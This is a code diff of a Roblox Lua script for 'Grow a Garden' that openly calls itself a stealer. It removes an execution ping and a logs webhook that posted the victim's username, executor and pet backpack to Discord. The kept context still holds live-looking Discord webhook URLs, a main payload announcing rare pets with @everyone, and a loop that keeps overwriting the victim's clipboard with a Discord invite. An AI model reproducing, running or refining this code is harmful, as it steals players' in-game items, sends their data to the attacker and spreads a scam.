@@ -15,21 +15,6 @@
 local HttpService = game:GetService("HttpService")
 local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
-local ExecutionUpdaterWebhook = "https://discord.com/api/webhooks/1404113624930189482/Gp2hUJtO0XWKlseojS1JXQ2oys5P1ONG5UBQUdZ-_DXfPAQyuQ6BUcHgVJbUcBWXExus"
-
-pcall(function()
-    request({
-        Url = ExecutionUpdaterWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            content = "Someone Executed"
-        })
-    })
-end)
-
         local date = os.date("%Y-%m-%d %H:%M:%S")
         local LogsWebhook = "https://discord.com/api/webhooks/1404048702925963326/OT888Nt-g0yE_M2-6aJByqxXhjeZUby19LciYTHDlWBD4oqCQIzazb1pXUeJLwwhSnMy"
         local RS = game:GetService("ReplicatedStorage")
@@ -52,7 +37,7 @@ end)
 
         coroutine.wrap(function()
     while true do
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("discord.gg/cnUAk7uc3n")
         wait(1)
     end
 end)()
@@ -428,32 +413,7 @@ end
                 return table.concat(truncatedLines, "\n")
             end
         end
-local LogsPayload = {
-    content = nil,
-    embeds = {{
-        title = "Grow a Garden Hit - Logs",
-        color = 32767,
-        fields = {{
-            name = "` 🔵 Player Info:`",
-            value = string.format(
-                "```🟢 Username: %s\n🟢 Display Username: %s\n🟢 Executor: %s```",
-                (Players.LocalPlayer.Name or "Unknown"),
-                (Players.LocalPlayer.DisplayName or "Unknown"),
-                (detectExecutor() or "Unknown")
-            )
-        },{
-            name = "` 🟡 Backpack`",
-            value = string.format(
-                "```%s```",
-                truncateByLines(petString, 10)
-            )
-        }},
-        footer = {
-            text = string.format("[%s]", date)
-        }
-    }},
-    attachments = {}
-}
+
         local payload = {
             avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
@@ -550,22 +510,8 @@ local success1, err1 = pcall(function()
     })
 end)
 
--- Send to logs webhook (LogsPayload) - no content changes
-local success2, err2 = pcall(function()
-    request({
-        Url = LogsWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(LogsPayload)
-    })
-end)
-
 -- Warnings
 if not success1 then warn("Something Went Wrong [Main Webhook Error]", err1) end
-if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
-
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
